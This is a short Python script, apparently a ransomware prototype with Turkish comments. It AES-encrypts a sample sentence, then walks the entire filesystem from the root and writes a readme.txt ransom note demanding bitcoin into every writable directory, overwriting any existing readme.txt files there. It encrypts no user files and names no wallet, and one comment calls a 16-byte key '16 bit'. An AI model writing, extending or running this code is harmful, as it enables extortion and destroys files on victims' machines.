import os

#Şifreleme kütüphaneleri

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
def encrypt(plaintext,key):
    cipher = AES.new(key, AES.MODE_CBC)  # CBC modunda şifreleme
    iv = cipher.iv  # Initialization Vector (IV) otomatik olarak oluşturuluyor
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))  # padding ile şifreleme
    return iv + ciphertext  # IV, şifreli metinle birlikte döndürülüyor


key = get_random_bytes(16)#16 bitlik rastgele bir şifre oluşturuluyor
plaintext = "Özlem gürses seni bulduğum yerde"

  

print("orjinal metin : ",plaintext)
sifrelenmis=encrypt(plaintext,key)
print("Şifreli veri : ",sifrelenmis.hex())




def main():
    try:
        name = "readme.txt"
        
        # / dizininde gezip her dizinde 'readme.txt' dosyasını oluşturmak
        for root, dirs, files in os.walk("/"):
            print(f"Checking directory: {root}")
            dd = os.path.join(root, name)  # Dosya yolu oluşturuluyor

            try:
                # Dosyayı yazma işlemi
                with open(dd, "w") as file:
                    file.write("if you want to decrypt the password send 0.0015 bits to this bitcoin account")
            
            except PermissionError:  # Hata yakalanırsa devam et  
                continue

    except Exception as e:
        print(f"Unexpected error: {e}")  # Herhangi bir beklenmedik hata

# Ana fonksiyonu çalıştır
main()
